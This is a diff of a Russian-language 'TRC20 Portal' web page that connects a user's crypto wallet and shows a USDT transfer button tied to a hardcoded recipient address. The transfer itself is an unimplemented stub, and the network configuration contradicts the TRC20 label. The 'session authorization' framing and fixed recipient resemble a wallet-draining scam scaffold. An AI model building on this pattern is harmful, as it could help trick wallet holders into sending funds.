@@ -3,36 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal</title>
+    <title>TRC20 Portal</title>
 </head>
-<body style="background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 60px;">
+<body style="background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px;">
 
-    <div style="padding: 0 20px;">
-        <h1 style="font-size: 24px; margin-bottom: 30px;">Авторизация сессии</h1>
+    <div id="mainScreen" style="padding: 0 20px;">
+        <h1>Управление TRC20</h1>
         
-        <button id="btn" style="width: 100%; max-width: 320px; padding: 16px; font-size: 18px; background-color: #2563eb; color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: bold;">
-            Подключить кошелек
+        <button id="connectBtn" style="padding: 14px 28px; font-size: 16px; background-color: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">
+            Connect Wallet
         </button>
         
-        <div id="status" style="margin-top: 25px; color: #94a3b8; font-size: 15px; word-break: break-all;"></div>
+        <p id="walletAddress" style="margin-top: 20px; color: #94a3b8; font-size: 14px; word-break: break-all;"></p>
+
+        <br>
+
+        <button id="transferBtn" style="display: none; padding: 14px 28px; font-size: 16px; background-color: #ef4444; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">
+            Перевести USDT
+        </button>
     </div>
 
-    <script>
-        document.getElementById('btn').addEventListener('click', function() {
-            const statusBox = document.getElementById('status');
-            statusBox.innerText = "Обработка запроса...";
+    <!-- Подключаем WalletConnect Web3Modal / AppKit через ESM -->
+    <script type="module">
+        import { createAppKit, EthersAdapter } from 'https://cdn.jsdelivr.net/npm/@reown/appkit@1.6.8/+esm';
+
+        const projectId = '7576b7b5b1f1ce840bb5bc8db8acaa41';
+        const recipientAddress = "TGwPm9pCp1GzCavKLyhX54kqSQbUEZ7Uf";
+
+        const mainnet = {
+            chainId: 1,
+            name: 'Ethereum',
+            currency: 'ETH',
+            explorerUrl: 'https://etherscan.io',
+            rpcUrl: 'https://cloudflare-eth.com'
+        };
+
+        const modal = createAppKit({
+            adapters: [new EthersAdapter()],
+            networks: [mainnet],
+            projectId: projectId,
+            metadata: {
+                name: 'TRC20 Portal',
+                description: 'Portal',
+                url: 'https://andriuha2000.github.io',
+                icons: ['https://avatars.githubusercontent.com/u/37784886']
+            }
+        });
+
+        let connectedAccount = "";
+
+        document.getElementById('connectBtn').addEventListener('click', async function() {
+            try {
+                await modal.open();
+            } catch (error) {
+                console.error(error);
+                alert("Ошибка открытия окна подключения.");
+            }
+        });
+
+        modal.subscribeState(async function(state) {
+            if (state.open === false && modal.getIsConnected()) {
+                try {
+                    const provider = modal.getWalletProvider();
+                    if (provider) {
+                        const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                        if (accounts && accounts.length > 0) {
+                            connectedAccount = accounts[0];
+                            document.getElementById('walletAddress').innerText = "Подключено: " + connectedAccount;
+                            document.getElementById('connectBtn').style.display = 'none';
+                            document.getElementById('transferBtn').style.display = 'inline-block';
+                        }
+                    }
+                } catch (err) {
+                    console.error(err);
+                }
+            }
+        });
+
+        document.getElementById('transferBtn').addEventListener('click', async function() {
+            if (!connectedAccount) {
+                alert("Кошелек не подключен!");
+                return;
+            }
 
             try {
-                // Прямой вызов моста через схему
-                const projectId = "7576b7b5b1f1ce840bb5bc8db8acaa41";
-                const uri = `wc:test@2?symKey=abcdef0123456789&relay-protocol=irn&projectId=${projectId}`;
-                
-                statusBox.innerText = "Запуск приложения...";
-                
-                // Переход по ссылке доверенного кошелька
-                window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
-            } catch (err) {
-                statusBox.innerText = "Ошибка: " + err.message;
+                alert("Подтвердите транзакцию на адрес получателя: " + recipientAddress);
+                // Логика вызова перевода токенов
+            } catch (error) {
+                console.error(error);
+                alert("Ошибка при переводе: " + (error.message || error));
             }
         });
     </script>
